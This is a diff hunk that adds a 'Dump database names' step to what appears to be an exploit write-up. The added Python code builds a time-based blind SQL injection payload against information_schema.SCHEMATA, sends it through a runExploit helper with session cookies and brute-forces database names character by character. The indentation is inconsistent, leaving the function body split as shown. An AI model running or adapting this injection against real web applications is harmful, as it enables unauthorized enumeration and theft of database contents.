@@ -568,3 +568,44 @@ Enumerate the number of databases
                     break
                 else:
                     i = i + 1
+
+Dump database names
+
+    def checkForDbName(index, currentDbName):
+        payload = generatePayload("0", "-13.37' or IF((SELECT SUBSTRING(SCHEMA_NAME, 1, " + str(len(currentDbName)) + ")='" + currentDbName + "' FROM information_schema.SCHEMATA  LIMIT " + str(index) + ", 1 ), sleep(0.05),FALSE) or '2'='1")
+
+    t1 = time.time()
+    runExploit(cookies, "GARUMPAGE", payload, proxies)
+    t2 = time.time()
+
+    if (t2 - t1 > 0.5):
+        return True
+    else:
+        return False
+
+    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
+    namesOfDatabases = []
+    numberOfDbs = 3
+    
+    for i in range(numberOfDbs):
+        currentDbName = '0'
+        if checkForDbName(i, 'information_schema'):
+            namesOfDatabases.append('information_schema')
+            print("Finally, database #" + str(i + 1) + " on server: information_schema")
+            continue
+        flagNoMoreChars = False
+        while (not flagNoMoreChars):
+            for j in range(len(chars)):
+                currentDbName = currentDbName[:len(currentDbName) - 1] + chars[j]
+                if checkForDbName(i, currentDbName):
+                    print("database #" + str(i + 1) + " on server: " + currentDbName + "...")
+                    currentDbName = currentDbName + '0'
+                    flagNoMoreChars = False
+                    break
+                else:
+                    flagNoMoreChars = True
+        currentDbName = currentDbName[:len(currentDbName) - 1]
+        print("Finally, database #" + str(i + 1) + " on server: " + currentDbName)
+        namesOfDatabases.append(currentDbName)
+    print("Databases: " + str(namesOfDatabases))
+
